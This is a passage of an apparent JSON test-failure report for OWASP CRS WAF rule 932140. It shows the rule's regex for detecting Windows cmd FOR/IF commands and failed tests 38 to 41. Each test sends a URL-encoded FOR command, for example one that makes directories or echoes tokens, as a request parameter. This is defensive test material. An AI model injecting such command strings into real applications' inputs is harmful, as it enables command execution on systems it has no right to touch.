          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 38,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 38,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22tokens%3D1-5%22+%25A+IN+%28%22This+is+a+short+sentence%22%29+DO+%40echo+%25A+%25B+%25D",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 39,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 39,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22tokens%3D1-5%22+%25%25A+IN+%28%22This+is+a+short+sentence%22%29+DO+%40echo+%25%25A+%25%25B+%25%25D",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 40,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 40,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%25G+IN+%28a%2Cb%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj%2Ck%2Cl%2Cm%2Cn%2Co%2Cp%2Cq%2Cr%2Cs%2Ct%2Cu%2Cv%2Cw%2Cx%2Cy%2Cz%29+DO+%28md+C%3A%5Cdemo%5C%25G%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 41,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 41,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%25%25G+IN+%28a%2Cb%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj%2Ck%2Cl%2Cm%2Cn%2Co%2Cp%2Cq%2Cr%2Cs%2Ct%2Cu%2Cv%2Cw%2Cx%2Cy%2Cz%29+DO+%28md+C%3A%5Cdemo%5C%25%25G%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
